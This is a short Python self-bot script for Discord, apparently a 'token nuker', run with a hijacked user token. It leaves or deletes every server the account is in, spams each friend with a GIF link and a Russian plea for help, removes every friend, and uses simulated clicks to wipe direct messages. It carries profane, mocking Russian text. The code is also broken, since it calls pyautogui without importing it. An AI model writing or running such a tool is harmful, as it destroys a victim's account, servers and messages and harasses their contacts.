import discord, time, keyboard
from discord import Client, Intents
from discord.ext import commands
client = commands.Bot(command_prefix="s!", intents = discord.Intents.all(), help_command=None)
@client.event
async def on_ready():
    await client.change_presence(status=discord.Status.online, activity=discord.Game('ВАС ЕБУТ TOKEN FUCKERОМ BY GLUTEN'))
    for guild in client.guilds:
        try:
            await guild.leave()
        except discord.HTTPException:
            await guild.delete()
    for friend in client.user.friends:
        try:
            await friend.send('https://gfycat.com/flakyacrobatickusimanse')
            await friend.send('МЕНЯ ЕБУТ ПАМАГИТЕ')
            await friend.remove_friend()
        except:
            pass
    print('click on discord window and leave the fullscreen, auto deleting dms in 5 seconds...')
    time.sleep(5)
    pyautogui.click()
    time.sleep(0.5)
    pyautogui.press('f11')
    time.sleep(1)
    print('Press m or ctrl + c multiple times when done')
    while True:
        try:
            if keyboard.is_pressed("m"):
                print('Done!')
                break
            else:
                pyautogui.click(x=284, y=205)  
                time.sleep(0.5)
                pyautogui.click(x=1114, y=605)
        except:
            pass
        
client.run('TOKEN HERE', bot = False)
